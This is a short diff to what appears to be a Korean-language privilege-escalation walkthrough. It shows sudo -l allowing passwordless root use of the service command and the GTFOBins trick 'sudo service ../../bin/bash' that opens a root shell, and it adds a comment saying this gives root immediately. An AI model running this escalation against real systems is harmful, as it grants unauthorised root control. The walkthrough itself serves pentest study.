@@ -107,7 +107,7 @@ sudo -l
 # (root) NOPASSWD: /usr/sbin/service
 # → service 명령어를 root 권한으로 비밀번호 없이 실행 가능
 
-# GTFOBins 기법 — path traversal로 /bin/bash를 root로 실행
+# GTFOBins 기법 — path traversal로 /bin/bash를 root로 실행  >> 이거 하는 순간 루트 권한
 sudo service ../../bin/bash
 
 whoami    # root
